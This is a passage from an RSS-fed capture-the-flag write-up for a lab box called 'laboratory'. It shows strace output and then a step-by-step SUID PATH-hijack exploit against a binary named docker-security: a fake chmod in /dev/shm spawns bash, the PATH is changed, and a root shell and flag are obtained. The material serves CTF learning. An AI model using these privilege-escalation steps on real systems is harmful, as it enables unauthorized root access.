 &lt;no <span style="color:#66d9ef">return</span> ...&gt;
--- SIGCHLD <span style="color:#f92672">(</span>Child exited<span style="color:#f92672">)</span> ---
&lt;... system resumed&gt; <span style="color:#f92672">)</span>                                                                                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span style="color:#e6db74">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
 &lt;no <span style="color:#66d9ef">return</span> ...&gt;
--- SIGCHLD <span style="color:#f92672">(</span>Child exited<span style="color:#f92672">)</span> ---
&lt;... system resumed&gt; <span style="color:#f92672">)</span>                                                                                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
+++ exited <span style="color:#f92672">(</span>status 0<span style="color:#f92672">)</span> +++
</code></pre></div><p>Knowing this, I could hijack the execution path.</p>
<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dexter@laboratory:~$ cd /dev/shm
dexter@laboratory:/dev/shm$ echo -e <span style="color:#e6db74">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
dexter@laboratory:/dev/shm$
dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
</code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it will point to my <code>chmod</code> on <code>/dev/shm</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dexter@laboratory:/dev/shm$ export PATH<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>:$PATH
dexter@laboratory:/dev/shm$
dexter@laboratory:/dev/shm$ which chmod
/dev/shm/chmod
</code></pre></div><p>From there, I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">dexter@laboratory:/dev/shm$ docker-security 
root@laboratory:/dev/shm#
root@laboratory:/dev/shm# cut -c6- /root/root.txt 
9f593f335a0a1f403c753719eb6
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
